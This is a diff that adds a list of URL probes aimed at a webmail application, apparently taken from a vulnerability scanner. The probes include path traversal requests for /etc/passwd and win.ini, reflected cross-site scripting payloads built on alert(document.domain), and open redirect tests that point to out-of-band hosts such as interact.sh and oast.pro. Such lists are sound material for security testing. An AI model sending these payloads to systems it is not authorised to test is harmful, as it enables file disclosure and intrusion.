@@ -1,0 +1,17 @@
+/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
+/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
+/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
+/webmail/
+/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
+/webmail/basic/?referer=https://interact.sh&_c=auth&ctz=120&signup_password=&_a%5bsignup%5d=1
+/webmail/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27
+/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27
+/webmail/?mid={{to_lower(rand_base(4))}}
+/webmail/?color=
+/%5coast.pro/%2f%2e%2e
+/?meta=%3Csvg%2Fonload=confirm%28document.domain%29%3E
+/%2f%5c%2foast.pro%2f..
+///interact.sh/%2F..
